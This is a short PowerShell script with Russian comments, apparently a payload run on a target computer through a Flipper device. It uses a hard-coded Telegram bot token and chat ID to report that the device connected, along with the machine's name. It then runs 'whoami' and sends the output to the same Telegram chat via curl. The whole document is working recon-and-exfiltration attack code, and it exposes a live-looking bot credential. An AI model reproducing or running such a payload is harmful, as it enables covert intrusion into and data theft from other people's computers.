$BotToken = "7812032063:AAHcpDZge7GoAFkgzVXMncdlyXn3eAX2A18"
$ChatID = "249127714"

# Отправка сообщения
$Message = "✅ Flipper подключился к " + $env:COMPUTERNAME
$URL = "https://api.telegram.org/bot$BotToken/sendMessage?chat_id=$ChatID&text=$Message"
curl -s $URL | Out-Null

# Выполнение одной тестовой команды
$Result = whoami
$URL = "https://api.telegram.org/bot$BotToken/sendMessage?chat_id=$ChatID&text=Результат:%0A$Result"
curl -s $URL | Out-Null
